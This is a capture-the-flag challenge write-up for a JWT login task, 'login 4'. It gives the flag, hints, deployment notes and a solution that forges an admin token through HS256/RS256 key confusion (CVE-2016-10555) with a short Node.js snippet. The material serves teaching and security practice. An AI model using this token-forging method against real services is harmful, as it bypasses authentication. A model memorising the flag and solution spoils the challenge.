# login 4
Very™ Enterprise® Login™ Page™ Ultimate℠. Now® With℠ [RFC 7519](https://tools.ietf.org/html/rfc7519).

Once™ Again™, We™ Have™ Provided™ A™ Premium™ Guest™ Login™ Ultimate℠ For™ You®!℠ The℠ Username™ Is™ `Guest™`, And® The® Password™ Is™ Also® `Guest℠`. As® You® Can® See™, This℠ Is℠ Very™ Enterprise® Secure™ Ultimate℠!

## Flag
```
camp{CVE-2016-10555_fw4hiI7}
```

## Points
400

## Category
Webex

## Hints
* What's [RFC 7519](https://tools.ietf.org/html/rfc7519)?
* What are some common vulnerabilities with JWT implementations?
* You need to some sort of key to make tokens...
* Consider using a programming library, such as [node-jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken), to help you.

## Downloads
* `server/enterpriseloginsigning.key.pub` (as-is, without a trailing newline)
* `server/index.js`

## Deployment
Deploy the contents of `server/` with an up-to-date version of Node.js. Pass in the following environment variables:
* `LOGIN4_FLAG` - the flag
* `LOGIN4_USERNAME` - guest username
* `LOGIN4_PASSWORD` - guest password
* `LOGIN4_PORT` - desired port to listen to

## Solution
A typical HS256/RS256 JWT confusion problem, in which a known asymmetric key can be used as a symmetric secret.

1. `npm install jsonwebtoken`
2. Run with Node.js:
    ```javascript
    const { sign } = require("jsonwebtoken");
    const { readFileSync } = require("fs");

    console.log(sign({
        isAdmin: true
    }, readFileSync("enterpriseloginsigning.key.pub", "utf8"), {expiresIn: 3600}));
    ```
3. Paste output into the `login4_token` cookie.
4. Browse to `/flag` and get flag.

## Author
Anthony Li